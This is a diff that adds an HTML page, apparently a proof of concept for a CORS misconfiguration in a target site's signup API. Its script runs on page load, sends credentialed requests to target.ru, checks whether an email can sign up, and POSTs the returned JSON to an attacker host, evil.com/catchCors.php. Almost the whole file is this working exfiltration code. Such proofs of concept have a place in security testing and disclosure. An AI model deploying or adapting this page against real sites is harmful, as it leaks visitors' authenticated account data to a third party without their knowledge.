@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Title</title>
+</head>
+<body>
+    <h1>CORS</h1>
+
+    <script>
+        // Target web application have vulnerable CORS in signup action.
+        // This script query signup action and send the result to the malicious app
+        var xhr = new XMLHttpRequest();
+        xhr.withCredentials = true;
+        xhr.open('GET', 'https://target.ru/api/auth/signup', false);
+        xhr.send();
+
+        function evilEvent(email) {
+            var XHR = ("onload" in new XMLHttpRequest()) ? XMLHttpRequest : XDomainRequest;
+            var xhr = new XHR();
+            xhr.open("POST", 'https://target.ru/api/auth/can-signup?email=' + email, false);
+            xhr.onload = function() {
+                window.resp = this.responseText;
+                json = JSON.parse(window.resp);
+                json.email = email;
+                xhr = new XMLHttpRequest();
+                xhr.open("POST", 'http://evil.com/catchCors.php', false);
+                xhr.setRequestHeader("Content-Type", "application/json");
+                xhr.send( JSON.stringify( json ));
+            }
+
+            xhr.onerror = function() {
+                console.log( 'Ошибка ' + this.status );
+            }
+
+            xhr.send();
+        }
+
+        evilEvent('foo@bar.ru');
+    </script>
+</body>
+</html>
